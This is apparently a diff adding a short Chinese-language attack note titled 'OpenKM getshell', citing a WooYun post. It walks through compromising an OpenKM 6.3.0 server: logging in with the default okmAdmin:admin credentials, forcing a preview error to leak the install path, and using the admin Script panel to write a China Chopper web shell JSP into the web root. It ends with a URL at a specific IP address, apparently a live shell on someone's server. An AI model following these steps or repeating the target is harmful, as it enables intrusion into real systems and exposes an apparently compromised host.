@@ -1,0 +1,26 @@
+# OpenKM getshell
+# 参考 http://zone.wooyun.org/content/27885
+1.登录
+   默认账号：okmAdmin:admin
+
+2.Add Document
+  -随便上传个文本保存的图片，然后Preview,导致报错
+  -错误信息中出现绝对路径
+  比如：
+  OK[8,2,1,1,["com.openkm.frontend.client.bean.GWTConverterStatus/3625464213",
+  "convert: improper image header `/opt/openkm-6.3.0-community/tomcat/temp/okm2207101076465775456.png' @ error/png.c/ReadPNGImage/3675.\nconvert: no images defined `/opt/openkm-6.3.0-community/tomcat/repository/cache/pdf/bd04c2b8-864e-483b-94da-bda9e6ba356d.pdf' @ error/convert.c/ConvertImageCommand/3044.\n"],0,7]
+  得到路径：/opt/openkm-6.3.0-community/tomcat/temp/okm2207101076465775456.png
+
+3. 进入右上部分的Administrator
+4. 进入左边上部分的Script
+5. 点浏览文件，遍历到安装路径/opt/openkm-6.3.0-community/tomcat/
+6. 选择一个ROOT目录下的文件，点勾选
+出现路径/opt/openkm-6.3.0-community/tomcat/webapps/ROOT/index.jsp
+7. 更改为：
+-/opt/openkm-6.3.0-community/tomcat/webapps/ROOT/caodai.jsp 
+或者我这里
+-/opt/openkm-6.3.0-community/tomcat/webapps/OpenKM/errorbak.jsp
+-上面填写菜刀的内容：
+-点击save
+8. 拿到shell:
+http://190.95.158.133:8080/OpenKM/errorbak.jsp
